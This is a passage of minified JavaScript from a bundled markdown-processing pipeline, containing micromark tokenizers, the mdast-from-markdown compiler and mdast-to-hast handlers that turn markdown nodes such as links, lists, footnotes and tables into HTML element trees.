t=Za(e[n])?{type:`Identifier`,name:e[n]}:{type:`Literal`,value:e[n]};i=i?{type:`MemberExpression`,object:i,property:t,computed:!!(n&&t.type===`Literal`),optional:!1}:t}r=i}else r=Za(t)&&!/^[a-z]/.test(t)?{type:`Identifier`,name:t}:{type:`Literal`,value:t};if(r.type===`Literal`){let t=r.value;return Go.call(e.components,t)?e.components[t]:t}if(e.evaluater)return e.evaluater.evaluateExpression(r);hs(e)}function hs(e,t){let n=new Uo("Cannot handle MDX estrees without `createEvaluater`",{ancestors:e.ancestors,place:t,ruleId:`mdx-estree`,source:`hast-util-to-jsx-runtime`});throw n.file=e.filePath||void 0,n.url=Xo+`#cannot-handle-mdx-estrees-without-createevaluater`,n}function gs(e){let t={},n;for(n in e)Go.call(e,n)&&(t[_s(n)]=e[n]);return t}function _s(e){let t=e.replace(qo,vs);return t.slice(0,3)===`ms-`&&(t=`-`+t),t}function vs(e){return`-`+e.toLowerCase()}var ys={action:[`form`],cite:[`blockquote`,`del`,`ins`,`q`],data:[`object`],formAction:[`button`,`input`],href:[`a`,`area`,`base`,`link`],icon:[`menuitem`],itemId:null,manifest:[`html`],ping:[`a`,`area`],poster:[`video`],src:[`audio`,`embed`,`iframe`,`img`,`input`,`script`,`source`,`track`,`video`]},bs={tokenize:xs};function xs(e){let t=e.attempt(this.parser.constructs.contentInitial,r,i),n;return t;function r(n){if(n===null){e.consume(n);return}return e.enter(`lineEnding`),e.consume(n),e.exit(`lineEnding`),P(e,t,`linePrefix`)}function i(t){return e.enter(`paragraph`),a(t)}function a(t){let r=e.enter(`chunkText`,{contentType:`text`,previous:n});return n&&(n.next=r),n=r,o(t)}function o(t){if(t===null){e.exit(`chunkText`),e.exit(`paragraph`),e.consume(t);return}return A(t)?(e.consume(t),e.exit(`chunkText`),a):(e.consume(t),o)}}var Ss={tokenize:ws},Cs={tokenize:Ts};function ws(e){let t=this,n=[],r=0,i,a,o;return s;function s(i){if(r<n.length){let a=n[r];return t.containerState=a[1],e.attempt(a[0].continuation,c,l)(i)}return l(i)}function c(e){if(r++,t.containerState._closeFlow){t.containerState._closeFlow=void 0,i&&v();let n=t.events.length,a=n,o;for(;a--;)if(t.events[a][0]===`exit`&&t.events[a][1].type===`chunkFlow`){o=t.events[a][1].end;break}_(r);let s=n;for(;s<t.events.length;)t.events[s][1].end={...o},s++;return lr(t.events,a+1,0,t.events.slice(n)),t.events.length=s,l(e)}return s(e)}function l(a){if(r===n.length){if(!i)return f(a);if(i.currentConstruct&&i.currentConstruct.concrete)return m(a);t.interrupt=!!(i.currentConstruct&&!i._gfmTableDynamicInterruptHack)}return t.containerState={},e.check(Cs,u,d)(a)}function u(e){return i&&v(),_(r),f(e)}function d(e){return t.parser.lazy[t.now().line]=r!==n.length,o=t.now().offset,m(e)}function f(n){return t.containerState={},e.attempt(Cs,p,m)(n)}function p(e){return r++,n.push([t.currentConstruct,t.containerState]),f(e)}function m(n){if(n===null){i&&v(),_(0),e.consume(n);return}return i||=t.parser.flow(t.now()),e.enter(`chunkFlow`,{_tokenizer:i,contentType:`flow`,previous:a}),h(n)}function h(n){if(n===null){g(e.exit(`chunkFlow`),!0),_(0),e.consume(n);return}return A(n)?(e.consume(n),g(e.exit(`chunkFlow`)),r=0,t.interrupt=void 0,s):(e.consume(n),h)}function g(e,n){let s=t.sliceStream(e);if(n&&s.push(null),e.previous=a,a&&(a.next=e),a=e,i.defineSkip(e.start),i.write(s),t.parser.lazy[e.start.line]){let e=i.events.length;for(;e--;)if(i.events[e][1].start.offset<o&&(!i.events[e][1].end||i.events[e][1].end.offset>o))return;let n=t.events.length,a=n,s,c;for(;a--;)if(t.events[a][0]===`exit`&&t.events[a][1].type===`chunkFlow`){if(s){c=t.events[a][1].end;break}s=!0}for(_(r),e=n;e<t.events.length;)t.events[e][1].end={...c},e++;lr(t.events,a+1,0,t.events.slice(n)),t.events.length=e}}function _(r){let i=n.length;for(;i-->r;){let r=n[i];t.containerState=r[1],r[0].exit.call(t,e)}n.length=r}function v(){i.write([null]),a=void 0,i=void 0,t.containerState._closeFlow=void 0}}function Ts(e,t,n){return P(e,e.attempt(this.parser.constructs.document,t,n),`linePrefix`,this.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)}var Es={tokenize:Ds};function Ds(e){let t=this,n=e.attempt(qr,r,e.attempt(this.parser.constructs.flowInitial,i,P(e,e.attempt(this.parser.constructs.flow,i,e.attempt(yi,i)),`linePrefix`)));return n;function r(r){if(r===null){e.consume(r);return}return e.enter(`lineEndingBlank`),e.consume(r),e.exit(`lineEndingBlank`),t.currentConstruct=void 0,n}function i(r){if(r===null){e.consume(r);return}return e.enter(`lineEnding`),e.consume(r),e.exit(`lineEnding`),t.currentConstruct=void 0,n}}var Os={resolveAll:Ms()},ks=js(`string`),As=js(`text`);function js(e){return{resolveAll:Ms(e===`text`?Ns:void 0),tokenize:t};function t(t){let n=this,r=this.parser.constructs[e],i=t.attempt(r,a,o);return a;function a(e){return c(e)?i(e):o(e)}function o(e){if(e===null){t.consume(e);return}return t.enter(`data`),t.consume(e),s}function s(e){return c(e)?(t.exit(`data`),i(e)):(t.consume(e),s)}function c(e){if(e===null)return!0;let t=r[e],i=-1;if(t)for(;++i<t.length;){let e=t[i];if(!e.previous||e.previous.call(n,n.previous))return!0}return!1}}}function Ms(e){return t;function t(t,n){let r=-1,i;for(;++r<=t.length;)i===void 0?t[r]&&t[r][1].type===`data`&&(i=r,r++):(!t[r]||t[r][1].type!==`data`)&&(r!==i+2&&(t[i][1].end=t[r-1][1].end,t.splice(i+2,r-i-2),r=i+2),i=void 0);return e?e(t,n):t}}function Ns(e,t){let n=0;for(;++n<=e.length;)if((n===e.length||e[n][1].type===`lineEnding`)&&e[n-1][1].type===`data`){let r=e[n-1][1],i=t.sliceStream(r),a=i.length,o=-1,s=0,c;for(;a--;){let e=i[a];if(typeof e==`string`){for(o=e.length;e.charCodeAt(o-1)===32;)s++,o--;if(o)break;o=-1}else if(e===-2)c=!0,s++;else if(e!==-1){a++;break}}if(t._contentTypeTextTrailing&&n===e.length&&(s=0),s){let i={type:n===e.length||c||s<2?`lineSuffix`:`hardBreakTrailing`,start:{_bufferIndex:a?o:r.start._bufferIndex+o,_index:r.start._index+a,line:r.end.line,column:r.end.column-s,offset:r.end.offset-s},end:{...r.end}};r.end={...i.start},r.start.offset===r.end.offset?Object.assign(r,i):(e.splice(n,0,[`enter`,i,t],[`exit`,i,t]),n+=2)}n++}return e}var Ps=s({attentionMarkers:()=>Hs,contentInitial:()=>Is,disable:()=>Us,document:()=>Fs,flow:()=>Rs,flowInitial:()=>Ls,insideSpan:()=>Vs,string:()=>zs,text:()=>Bs}),Fs={42:I,43:I,45:I,48:I,49:I,50:I,51:I,52:I,53:I,54:I,55:I,56:I,57:I,62:Yr},Is={91:Oi},Ls={[-2]:si,[-1]:si,32:si},Rs={35:Pi,42:la,45:[va,la],60:F,61:va,95:la,96:ii,126:ii},zs={38:ti,92:$r},Bs={[-5]:sa,[-4]:sa,[-3]:sa,33:ra,38:ti,42:Vr,60:[Gr,Gi],91:aa,92:[Mi,$r],93:qi,95:Vr,96:di},Vs={null:[Vr,Os]},Hs={null:[42,95]},Us={null:[]};function Ws(e,t,n){let r={_bufferIndex:-1,_index:0,line:n&&n.line||1,column:n&&n.column||1,offset:n&&n.offset||0},i={},a=[],o=[],s=[],c={attempt:S(x),check:S(ee),consume:v,enter:y,exit:b,interrupt:S(ee,{interrupt:!0})},l={code:null,containerState:{},defineSkip:h,events:[],now:m,parser:e,previous:null,sliceSerialize:f,sliceStream:p,write:d},u=t.tokenize.call(l,c);return t.resolveAll&&a.push(t),l;function d(e){return o=ur(o,e),g(),o[o.length-1]===null?(C(t,0),l.events=Br(a,l.events,l),l.events):[]}function f(e,t){return Ks(p(e),t)}function p(e){return Gs(o,e)}function m(){let{_bufferIndex:e,_index:t,line:n,column:i,offset:a}=r;return{_bufferIndex:e,_index:t,line:n,column:i,offset:a}}function h(e){i[e.line]=e.column,T()}function g(){let e;for(;r._index<o.length;){let t=o[r._index];if(typeof t==`string`)for(e=r._index,r._bufferIndex<0&&(r._bufferIndex=0);r._index===e&&r._bufferIndex<t.length;)_(t.charCodeAt(r._bufferIndex));else _(t)}}function _(e){u=u(e)}function v(e){A(e)?(r.line++,r.column=1,r.offset+=e===-3?2:1,T()):e!==-1&&(r.column++,r.offset++),r._bufferIndex<0?r._index++:(r._bufferIndex++,r._bufferIndex===o[r._index].length&&(r._bufferIndex=-1,r._index++)),l.previous=e}function y(e,t){let n=t||{};return n.type=e,n.start=m(),l.events.push([`enter`,n,l]),s.push(n),n}function b(e){let t=s.pop();return t.end=m(),l.events.push([`exit`,t,l]),t}function x(e,t){C(e,t.from)}function ee(e,t){t.restore()}function S(e,t){return n;function n(n,r,i){let a,o,s,u;return Array.isArray(n)?f(n):`tokenize`in n?f([n]):d(n);function d(e){return t;function t(t){let n=t!==null&&e[t],r=t!==null&&e.null;return f([...Array.isArray(n)?n:n?[n]:[],...Array.isArray(r)?r:r?[r]:[]])(t)}}function f(e){return a=e,o=0,e.length===0?i:p(e[o])}function p(e){return n;function n(n){return u=w(),s=e,e.partial||(l.currentConstruct=e),e.name&&l.parser.constructs.disable.null.includes(e.name)?h(n):e.tokenize.call(t?Object.assign(Object.create(l),t):l,c,m,h)(n)}}function m(t){return e(s,u),r}function h(e){return u.restore(),++o<a.length?p(a[o]):i}}}function C(e,t){e.resolveAll&&!a.includes(e)&&a.push(e),e.resolve&&lr(l.events,t,l.events.length-t,e.resolve(l.events.slice(t),l)),e.resolveTo&&(l.events=e.resolveTo(l.events,l))}function w(){let e=m(),t=l.previous,n=l.currentConstruct,i=l.events.length,a=Array.from(s);return{from:i,restore:o};function o(){r=e,l.previous=t,l.currentConstruct=n,l.events.length=i,s=a,T()}}function T(){r.line in i&&r.column<2&&(r.column=i[r.line],r.offset+=i[r.line]-1)}}function Gs(e,t){let n=t.start._index,r=t.start._bufferIndex,i=t.end._index,a=t.end._bufferIndex,o;if(n===i)o=[e[n].slice(r,a)];else{if(o=e.slice(n,i),r>-1){let e=o[0];typeof e==`string`?o[0]=e.slice(r):o.shift()}a>0&&o.push(e[i].slice(0,a))}return o}function Ks(e,t){let n=-1,r=[],i;for(;++n<e.length;){let a=e[n],o;if(typeof a==`string`)o=a;else switch(a){case-5:o=`\r`;break;case-4:o=`
`;break;case-3:o=`\r
`;break;case-2:o=t?` `:`	`;break;case-1:if(!t&&i)continue;o=` `;break;default:o=String.fromCharCode(a)}i=a===-2,r.push(o)}return r.join(``)}function qs(e){let t={constructs:fr([Ps,...(e||{}).extensions||[]]),content:n(bs),defined:[],document:n(Ss),flow:n(Es),lazy:{},string:n(ks),text:n(As)};return t;function n(e){return n;function n(n){return Ws(t,e,n)}}}function Js(e){for(;!_i(e););return e}var Ys=/[\0\t\n\r]/g;function Xs(){let e=1,t=``,n=!0,r;return i;function i(i,a,o){let s=[],c,l,u,d,f;for(i=t+(typeof i==`string`?i.toString():new TextDecoder(a||void 0).decode(i)),u=0,t=``,n&&=(i.charCodeAt(0)===65279&&u++,void 0);u<i.length;){if(Ys.lastIndex=u,c=Ys.exec(i),d=c&&c.index!==void 0?c.index:i.length,f=i.charCodeAt(d),!c){t=i.slice(u);break}if(f===10&&u===d&&r)s.push(-3),r=void 0;else switch(r&&=(s.push(-5),void 0),u<d&&(s.push(i.slice(u,d)),e+=d-u),f){case 0:s.push(65533),e++;break;case 9:for(l=Math.ceil(e/4)*4,s.push(-2);e++<l;)s.push(-1);break;case 10:s.push(-4),e=1;break;default:r=!0,e=1}u=d+1}return o&&(r&&s.push(-5),t&&s.push(t),s.push(null)),s}}var Zs={}.hasOwnProperty;function Qs(e,t,n){return t&&typeof t==`object`&&(n=t,t=void 0),$s(n)(Js(qs(n).document().write(Xs()(e,t,!0))))}function $s(e){let t={transforms:[],canContainEols:[`emphasis`,`fragment`,`heading`,`paragraph`,`strong`],enter:{autolink:a(Te),autolinkProtocol:w,autolinkEmail:w,atxHeading:a(xe),blockQuote:a(ge),characterEscape:w,characterReference:w,codeFenced:a(_e),codeFencedFenceInfo:o,codeFencedFenceMeta:o,codeIndented:a(_e,o),codeText:a(ve,o),codeTextData:w,data:w,codeFlowValue:w,definition:a(ye),definitionDestinationString:o,definitionLabelString:o,definitionTitleString:o,emphasis:a(be),hardBreakEscape:a(Se),hardBreakTrailing:a(Se),htmlFlow:a(Ce,o),htmlFlowData:w,htmlText:a(Ce,o),htmlTextData:w,image:a(we),label:o,link:a(Te),listItem:a(De),listItemValue:f,listOrdered:a(Ee,d),listUnordered:a(Ee),paragraph:a(Oe),reference:ue,referenceString:o,resourceDestinationString:o,resourceTitleString:o,setextHeading:a(xe),strong:a(ke),thematicBreak:a(A)},exit:{atxHeading:c(),atxHeadingSequence:x,autolink:c(),autolinkEmail:he,autolinkProtocol:me,blockQuote:c(),characterEscapeValue:T,characterReferenceMarkerHexadecimal:fe,characterReferenceMarkerNumeric:fe,characterReferenceValue:pe,characterReference:k,codeFenced:c(g),codeFencedFence:h,codeFencedFenceInfo:p,codeFencedFenceMeta:m,codeFlowValue:T,codeIndented:c(_),codeText:c(ie),codeTextData:T,data:T,definition:c(),definitionDestinationString:b,definitionLabelString:v,definitionTitleString:y,emphasis:c(),hardBreakEscape:c(E),hardBreakTrailing:c(E),htmlFlow:c(ne),htmlFlowData:T,htmlText:c(re),htmlTextData:T,image:c(oe),label:ce,labelText:se,lineEnding:te,link:c(ae),listItem:c(),listOrdered:c(),listUnordered:c(),paragraph:c(),referenceString:de,resourceDestinationString:D,resourceTitleString:O,resource:le,setextHeading:c(C),setextHeadingLineSequence:S,setextHeadingText:ee,strong:c(),thematicBreak:c()}};tc(t,(e||{}).mdastExtensions||[]);let n={};return r;function r(e){let r={type:`root`,children:[]},a={stack:[r],tokenStack:[],config:t,enter:s,exit:l,buffer:o,resume:u,data:n},c=[],d=-1;for(;++d<e.length;)(e[d][1].type===`listOrdered`||e[d][1].type===`listUnordered`)&&(e[d][0]===`enter`?c.push(d):d=i(e,c.pop(),d));for(d=-1;++d<e.length;){let n=t[e[d][0]];Zs.call(n,e[d][1].type)&&n[e[d][1].type].call(Object.assign({sliceSerialize:e[d][2].sliceSerialize},a),e[d][1])}if(a.tokenStack.length>0){let e=a.tokenStack[a.tokenStack.length-1];(e[1]||rc).call(a,void 0,e[0])}for(r.position={start:ec(e.length>0?e[0][1].start:{line:1,column:1,offset:0}),end:ec(e.length>0?e[e.length-2][1].end:{line:1,column:1,offset:0})},d=-1;++d<t.transforms.length;)r=t.transforms[d](r)||r;return r}function i(e,t,n){let r=t-1,i=-1,a=!1,o,s,c,l;for(;++r<=n;){let t=e[r];switch(t[1].type){case`listUnordered`:case`listOrdered`:case`blockQuote`:t[0]===`enter`?i++:i--,l=void 0;break;case`lineEndingBlank`:t[0]===`enter`&&(o&&!l&&!i&&!c&&(c=r),l=void 0);break;case`linePrefix`:case`listItemValue`:case`listItemMarker`:case`listItemPrefix`:case`listItemPrefixWhitespace`:break;default:l=void 0}if(!i&&t[0]===`enter`&&t[1].type===`listItemPrefix`||i===-1&&t[0]===`exit`&&(t[1].type===`listUnordered`||t[1].type===`listOrdered`)){if(o){let i=r;for(s=void 0;i--;){let t=e[i];if(t[1].type===`lineEnding`||t[1].type===`lineEndingBlank`){if(t[0]===`exit`)continue;s&&(e[s][1].type=`lineEndingBlank`,a=!0),t[1].type=`lineEnding`,s=i}else if(t[1].type!==`linePrefix`&&t[1].type!==`blockQuotePrefix`&&t[1].type!==`blockQuotePrefixWhitespace`&&t[1].type!==`blockQuoteMarker`&&t[1].type!==`listItemIndent`)break}c&&(!s||c<s)&&(o._spread=!0),o.end=Object.assign({},s?e[s][1].start:t[1].end),e.splice(s||r,0,[`exit`,o,t[2]]),r++,n++}if(t[1].type===`listItemPrefix`){let i={type:`listItem`,_spread:!1,start:Object.assign({},t[1].start),end:void 0};o=i,e.splice(r,0,[`enter`,i,t[2]]),r++,n++,c=void 0,l=!0}}}return e[t][1]._spread=a,n}function a(e,t){return n;function n(n){s.call(this,e(n),n),t&&t.call(this,n)}}function o(){this.stack.push({type:`fragment`,children:[]})}function s(e,t,n){this.stack[this.stack.length-1].children.push(e),this.stack.push(e),this.tokenStack.push([t,n||void 0]),e.position={start:ec(t.start),end:void 0}}function c(e){return t;function t(t){e&&e.call(this,t),l.call(this,t)}}function l(e,t){let n=this.stack.pop(),r=this.tokenStack.pop();if(r)r[0].type!==e.type&&(t?t.call(this,e,r[0]):(r[1]||rc).call(this,e,r[0]));else throw Error("Cannot close `"+e.type+"` ("+zo({start:e.start,end:e.end})+`): it’s not open`);n.position.end=ec(e.end)}function u(){return an(this.stack.pop())}function d(){this.data.expectingFirstListItemValue=!0}function f(e){if(this.data.expectingFirstListItemValue){let t=this.stack[this.stack.length-2];t.start=Number.parseInt(this.sliceSerialize(e),10),this.data.expectingFirstListItemValue=void 0}}function p(){let e=this.resume(),t=this.stack[this.stack.length-1];t.lang=e}function m(){let e=this.resume(),t=this.stack[this.stack.length-1];t.meta=e}function h(){this.data.flowCodeInside||(this.buffer(),this.data.flowCodeInside=!0)}function g(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e.replace(/^(\r?\n|\r)|(\r?\n|\r)$/g,``),this.data.flowCodeInside=void 0}function _(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e.replace(/(\r?\n|\r)$/g,``)}function v(e){let t=this.resume(),n=this.stack[this.stack.length-1];n.label=t,n.identifier=N(this.sliceSerialize(e)).toLowerCase()}function y(){let e=this.resume(),t=this.stack[this.stack.length-1];t.title=e}function b(){let e=this.resume(),t=this.stack[this.stack.length-1];t.url=e}function x(e){let t=this.stack[this.stack.length-1];t.depth||=this.sliceSerialize(e).length}function ee(){this.data.setextHeadingSlurpLineEnding=!0}function S(e){let t=this.stack[this.stack.length-1];t.depth=this.sliceSerialize(e).codePointAt(0)===61?1:2}function C(){this.data.setextHeadingSlurpLineEnding=void 0}function w(e){let t=this.stack[this.stack.length-1].children,n=t[t.length-1];(!n||n.type!==`text`)&&(n=Ae(),n.position={start:ec(e.start),end:void 0},t.push(n)),this.stack.push(n)}function T(e){let t=this.stack.pop();t.value+=this.sliceSerialize(e),t.position.end=ec(e.end)}function te(e){let n=this.stack[this.stack.length-1];if(this.data.atHardBreak){let t=n.children[n.children.length-1];t.position.end=ec(e.end),this.data.atHardBreak=void 0;return}!this.data.setextHeadingSlurpLineEnding&&t.canContainEols.includes(n.type)&&(w.call(this,e),T.call(this,e))}function E(){this.data.atHardBreak=!0}function ne(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e}function re(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e}function ie(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e}function ae(){let e=this.stack[this.stack.length-1];if(this.data.inReference){let t=this.data.referenceType||`shortcut`;e.type+=`Reference`,e.referenceType=t,delete e.url,delete e.title}else delete e.identifier,delete e.label;this.data.referenceType=void 0}function oe(){let e=this.stack[this.stack.length-1];if(this.data.inReference){let t=this.data.referenceType||`shortcut`;e.type+=`Reference`,e.referenceType=t,delete e.url,delete e.title}else delete e.identifier,delete e.label;this.data.referenceType=void 0}function se(e){let t=this.sliceSerialize(e),n=this.stack[this.stack.length-2];n.label=Gn(t),n.identifier=N(t).toLowerCase()}function ce(){let e=this.stack[this.stack.length-1],t=this.resume(),n=this.stack[this.stack.length-1];this.data.inReference=!0,n.type===`link`?n.children=e.children:n.alt=t}function D(){let e=this.resume(),t=this.stack[this.stack.length-1];t.url=e}function O(){let e=this.resume(),t=this.stack[this.stack.length-1];t.title=e}function le(){this.data.inReference=void 0}function ue(){this.data.referenceType=`collapsed`}function de(e){let t=this.resume(),n=this.stack[this.stack.length-1];n.label=t,n.identifier=N(this.sliceSerialize(e)).toLowerCase(),this.data.referenceType=`full`}function fe(e){this.data.characterReferenceType=e.type}function pe(e){let t=this.sliceSerialize(e),n=this.data.characterReferenceType,r;n?(r=Un(t,n===`characterReferenceMarkerNumeric`?10:16),this.data.characterReferenceType=void 0):r=Hn(t);let i=this.stack[this.stack.length-1];i.value+=r}function k(e){let t=this.stack.pop();t.position.end=ec(e.end)}function me(e){T.call(this,e);let t=this.stack[this.stack.length-1];t.url=this.sliceSerialize(e)}function he(e){T.call(this,e);let t=this.stack[this.stack.length-1];t.url=`mailto:`+this.sliceSerialize(e)}function ge(){return{type:`blockquote`,children:[]}}function _e(){return{type:`code`,lang:null,meta:null,value:``}}function ve(){return{type:`inlineCode`,value:``}}function ye(){return{type:`definition`,identifier:``,label:null,title:null,url:``}}function be(){return{type:`emphasis`,children:[]}}function xe(){return{type:`heading`,depth:0,children:[]}}function Se(){return{type:`break`}}function Ce(){return{type:`html`,value:``}}function we(){return{type:`image`,title:null,url:``,alt:null}}function Te(){return{type:`link`,title:null,url:``,children:[]}}function Ee(e){return{type:`list`,ordered:e.type===`listOrdered`,start:null,spread:e._spread,children:[]}}function De(e){return{type:`listItem`,spread:e._spread,checked:null,children:[]}}function Oe(){return{type:`paragraph`,children:[]}}function ke(){return{type:`strong`,children:[]}}function Ae(){return{type:`text`,value:``}}function A(){return{type:`thematicBreak`}}}function ec(e){return{line:e.line,column:e.column,offset:e.offset}}function tc(e,t){let n=-1;for(;++n<t.length;){let r=t[n];Array.isArray(r)?tc(e,r):nc(e,r)}}function nc(e,t){let n;for(n in t)if(Zs.call(t,n))switch(n){case`canContainEols`:{let r=t[n];r&&e[n].push(...r);break}case`transforms`:{let r=t[n];r&&e[n].push(...r);break}case`enter`:case`exit`:{let r=t[n];r&&Object.assign(e[n],r);break}}}function rc(e,t){throw Error(e?"Cannot close `"+e.type+"` ("+zo({start:e.start,end:e.end})+"): a different token (`"+t.type+"`, "+zo({start:t.start,end:t.end})+`) is open`:"Cannot close document, a token (`"+t.type+"`, "+zo({start:t.start,end:t.end})+`) is still open`)}function ic(e){let t=this;t.parser=n;function n(n){return Qs(n,{...t.data(`settings`),...e,extensions:t.data(`micromarkExtensions`)||[],mdastExtensions:t.data(`fromMarkdownExtensions`)||[]})}}function ac(e,t){let n={type:`element`,tagName:`blockquote`,properties:{},children:e.wrap(e.all(t),!0)};return e.patch(t,n),e.applyData(t,n)}function oc(e,t){let n={type:`element`,tagName:`br`,properties:{},children:[]};return e.patch(t,n),[e.applyData(t,n),{type:`text`,value:`
`}]}function sc(e,t){let n=t.value?t.value+`
`:``,r={},i=t.lang?t.lang.split(/\s+/):[];i.length>0&&(r.className=[`language-`+i[0]]);let a={type:`element`,tagName:`code`,properties:r,children:[{type:`text`,value:n}]};return t.meta&&(a.data={meta:t.meta}),e.patch(t,a),a=e.applyData(t,a),a={type:`element`,tagName:`pre`,properties:{},children:[a]},e.patch(t,a),a}function cc(e,t){let n={type:`element`,tagName:`del`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function lc(e,t){let n={type:`element`,tagName:`em`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function uc(e,t){let n=typeof e.options.clobberPrefix==`string`?e.options.clobberPrefix:`user-content-`,r=String(t.identifier).toUpperCase(),i=zr(r.toLowerCase()),a=e.footnoteOrder.indexOf(r),o,s=e.footnoteCounts.get(r);s===void 0?(s=0,e.footnoteOrder.push(r),o=e.footnoteOrder.length):o=a+1,s+=1,e.footnoteCounts.set(r,s);let c={type:`element`,tagName:`a`,properties:{href:`#`+n+`fn-`+i,id:n+`fnref-`+i+(s>1?`-`+s:``),dataFootnoteRef:!0,ariaDescribedBy:[`footnote-label`]},children:[{type:`text`,value:String(o)}]};e.patch(t,c);let l={type:`element`,tagName:`sup`,properties:{},children:[c]};return e.patch(t,l),e.applyData(t,l)}function dc(e,t){let n={type:`element`,tagName:`h`+t.depth,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function fc(e,t){if(e.options.allowDangerousHtml){let n={type:`raw`,value:t.value};return e.patch(t,n),e.applyData(t,n)}}function pc(e,t){let n=t.referenceType,r=`]`;if(n===`collapsed`?r+=`[]`:n===`full`&&(r+=`[`+(t.label||t.identifier)+`]`),t.type===`imageReference`)return[{type:`text`,value:`![`+t.alt+r}];let i=e.all(t),a=i[0];a&&a.type===`text`?a.value=`[`+a.value:i.unshift({type:`text`,value:`[`});let o=i[i.length-1];return o&&o.type===`text`?o.value+=r:i.push({type:`text`,value:r}),i}function mc(e,t){let n=String(t.identifier).toUpperCase(),r=e.definitionById.get(n);if(!r)return pc(e,t);let i={src:zr(r.url||``),alt:t.alt};r.title!==null&&r.title!==void 0&&(i.title=r.title);let a={type:`element`,tagName:`img`,properties:i,children:[]};return e.patch(t,a),e.applyData(t,a)}function hc(e,t){let n={src:zr(t.url)};t.alt!==null&&t.alt!==void 0&&(n.alt=t.alt),t.title!==null&&t.title!==void 0&&(n.title=t.title);let r={type:`element`,tagName:`img`,properties:n,children:[]};return e.patch(t,r),e.applyData(t,r)}function gc(e,t){let n={type:`text`,value:t.value.replace(/\r?\n|\r/g,` `)};e.patch(t,n);let r={type:`element`,tagName:`code`,properties:{},children:[n]};return e.patch(t,r),e.applyData(t,r)}function _c(e,t){let n=String(t.identifier).toUpperCase(),r=e.definitionById.get(n);if(!r)return pc(e,t);let i={href:zr(r.url||``)};r.title!==null&&r.title!==void 0&&(i.title=r.title);let a={type:`element`,tagName:`a`,properties:i,children:e.all(t)};return e.patch(t,a),e.applyData(t,a)}function vc(e,t){let n={href:zr(t.url)};t.title!==null&&t.title!==void 0&&(n.title=t.title);let r={type:`element`,tagName:`a`,properties:n,children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function yc(e,t,n){let r=e.all(t),i=n?bc(n):xc(t),a={},o=[];if(typeof t.checked==`boolean`){let e=r[0],n;e&&e.type===`element`&&e.tagName===`p`?n=e:(n={type:`element`,tagName:`p`,properties:{},children:[]},r.unshift(n)),n.children.length>0&&n.children.unshift({type:`text`,value:` `}),n.children.unshift({type:`element`,tagName:`input`,properties:{type:`checkbox`,checked:t.checked,disabled:!0},children:[]}),a.className=[`task-list-item`]}let s=-1;for(;++s<r.length;){let e=r[s];(i||s!==0||e.type!==`element`||e.tagName!==`p`)&&o.push({type:`text`,value:`
`}),e.type===`element`&&e.tagName===`p`&&!i?o.push(...e.children):o.push(e)}let c=r[r.length-1];c&&(i||c.type!==`element`||c.tagName!==`p`)&&o.push({type:`text`,value:`
`});let l={type:`element`,tagName:`li`,properties:a,children:o};return e.patch(t,l),e.applyData(t,l)}function bc(e){let t=!1;if(e.type===`list`){t=e.spread||!1;let n=e.children,r=-1;for(;!t&&++r<n.length;)t=xc(n[r])}return t}function xc(e){return e.spread??e.children.length>1}function Sc(e,t){let n={},r=e.all(t),i=-1;for(typeof t.start==`number`&&t.start!==1&&(n.start=t.start);++i<r.length;){let e=r[i];if(e.type===`element`&&e.tagName===`li`&&e.properties&&Array.isArray(e.properties.className)&&e.properties.className.includes(`task-list-item`)){n.className=[`contains-task-list`];break}}let a={type:`element`,tagName:t.ordered?`ol`:`ul`,properties:n,children:e.wrap(r,!0)};return e.patch(t,a),e.applyData(t,a)}function Cc(e,t){let n={type:`element`,tagName:`p`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function wc(e,t){let n={type:`root`,children:e.wrap(e.all(t))};return e.patch(t,n),e.applyData(t,n)}function Tc(e,t){let n={type:`element`,tagName:`strong`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function Ec(e,t){let n=e.all(t),r=n.shift(),i=[];if(r){let n={type:`element`,tagName:`thead`,properties:{},children:e.wrap([r],!0)};e.patch(t.children[0],n),i.push(n)}if(n.length>0){let r={type:`element`,tagName:`tbody`,properties:{},children:e.wrap(n,!0)},a=Io(t.children[1]),o=Fo(t.children[t.children.length-1]);a&&o&&(r.position={start:a,end:o}),i.push(r)}let a={type:`element`,tagName:`table`,properties:{},children:e.wrap(i,!0)};return e.patch(t,a),e.applyData(t,a)}function Dc(e,t,n){let r=n?n.children:void 0,i=(r?r.indexOf(t):1)===0?`th`:`td`,a=n&&n.type===`table`?n.align:void 0,o=a?a.length:t.children.length,s=-1,c=[];for(;++s<o;){let n=t.children[s],r={},o=a?a[s]:void 0;o&&(r.align=o);let l={type:`element`,tagName:i,properties:r,children:[]};n&&(l.children=e.all(n),e.patch(n,l),l=e.applyData(n,l)),c.push(l)}let l={type:`element`,tagName:`tr`,properties:{},children:e.wrap(c,!0)};return e.patch(t,l),e.applyData(t,l)}function Oc(e,t){let n={type:`element`,tagName:`td`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}var kc=9,Ac=32;function jc(e){let t=String(e),n=/\r?\n|\r/g,r=n.exec(t),i=0,a=[];for(;r;)a.push(Mc(t.slice(i,r.index),i>0,!0),r[0]),i=r.index+r[0].length,r=n.exec(t);return a.push(Mc(t.slice(i),i>0,!1)),a.join(``)}function Mc(e,t,n){let r=0,i=e.length;if(t){let t=e.codePointAt(r);for(;t===kc||t===Ac;)r++,t=e.codePointAt(r)}if(n){let t=e.codePointAt(i-1);for(;t===kc||t===Ac;)i--,t=e.codePointAt(i-1)}return i>r?e.slice(r,i):``}function Nc(e,t){let n={type:`text`,value:jc(String(t.value))};return e.patch(t,n),e.applyData(t,n)}function Pc(e,t){let n={type:`element`,tagName:`hr`,properties:{},children:[]};return e.patch(t,n),e.applyData(t,n)}var 